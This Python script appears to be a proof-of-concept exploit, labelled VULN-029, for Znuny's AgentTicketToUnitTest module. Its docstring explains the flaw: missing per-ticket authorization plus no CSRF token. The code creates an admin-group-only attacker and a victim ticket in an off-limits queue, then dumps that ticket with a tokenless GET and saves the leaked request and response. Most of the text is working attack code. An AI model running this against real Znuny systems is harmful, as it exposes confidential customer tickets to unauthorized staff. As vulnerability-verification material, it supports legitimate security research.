#!/usr/bin/env python3
r"""
VULN-029 — AgentTicketToUnitTest dumps/exfils ANY ticket (no ticket authz, no CSRF token)
==========================================================================================
Vulnerable code : targets/Znuny/Kernel/Modules/AgentTicketToUnitTest.pm (0 TicketPermission,
                  0 ChallengeTokenCheck); registration Znuny.xml Group=>['admin']
Vulnerability   : CWE-862 Missing Authorization + CWE-352 CSRF

Flaw
----
The module reads `TicketID`, serialises the entire ticket (history/articles/dynamic fields) and
either downloads it (CreateFile) or emails it to support@znuny.com (SendEmail) — with NO
per-ticket TicketPermission and NO ChallengeToken. Its only gate is `admin`-frontend-group
membership, which in the OTRS model governs admin *screens*, not per-queue ticket ACLs. So an
admin-group operator with zero queue permissions dumps any ticket by numeric ID.

Exploit: an agent in the `admin` group but with NO queue/ticket permissions dumps a victim ticket
that lives in an off-limits queue; the response contains the victim's confidential content.
"""
import os, sys
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import _common as C

HERE = os.path.dirname(os.path.abspath(__file__))

def main():
    C.banner("VULN-029", "AgentTicketToUnitTest dumps ANY ticket (admin-group, no ticket authz)",
             ["no TicketPermission + no ChallengeToken; only gate is admin-frontend group"])
    sfx = C.rid()
    # attacker: admin-frontend group ONLY (no queue/ticket group) -> 0 per-ticket permission
    au, ap = C.create_agent(login=f"att029_{sfx}", groups=["admin"])
    C.log("SETUP", f"attacker {au} — member of 'admin' frontend group only (no queue rights)")
    vgrp = C.create_group(f"vgrp029_{sfx}"); vq = C.create_queue(f"vq029_{sfx}", group=vgrp)
    secret = f"CONFIDENTIAL-VULN029-{sfx}"
    vtid, vtn = C.create_ticket(secret, vq, body=f"top secret body {sfx}",
                                customer_id="victimco", customer_user="victimco")
    C.log("SETUP", f"victim ticket TID={vtid} (title carries marker {secret}) in off-limits queue {vq}")

    a = C.agent_client(au, ap)
    vic_perm = C.perm_check(au, vtid)
    C.log("PROOF", f"attacker TicketPermission on victim {vtid}: {vic_perm} (all 0 = no ticket rights)")
    if any(vic_perm.values()):
        C.failed("premise broken: attacker already has ticket rights on the victim")

    # tokenless GET dump of the victim ticket
    C.log("STEP", f"attacker GET AgentTicketToUnitTest;Subaction=CreateFile;TicketID={vtid}")
    r = a.get({"Action": "AgentTicketToUnitTest", "Subaction": "CreateFile", "TicketID": vtid})
    leaked = secret in r.text
    cd = r.headers.get("Content-Disposition", "")
    C.log("PROOF", f"HTTP {r.status_code}; Content-Disposition={cd!r}; victim marker in dump: {leaked}")

    open(os.path.join(HERE, "request.http"), "w").write(
        f"GET /znuny/index.pl?Action=AgentTicketToUnitTest;Subaction=CreateFile;TicketID={vtid} "
        "HTTP/1.1\r\nCookie: OTRSAgentInterface=<admin-group attacker>\r\n(no ChallengeToken)\r\n")
    open(os.path.join(HERE, "response.txt"), "w").write(
        f"Content-Disposition: {cd}\nvictim marker present: {leaked}\n\n--- dump head ---\n{r.text[:800]}")

    if leaked:
        C.confirmed(f"admin-group attacker with NO ticket rights on queue {vq} dumped victim ticket "
                    f"{vtid} (marker '{secret}' present) via a tokenless GET — missing per-ticket "
                    "authorization + CSRF on AgentTicketToUnitTest.")
    else:
        C.failed(f"victim marker not found in dump (status {r.status_code})")

if __name__ == "__main__":
    main()
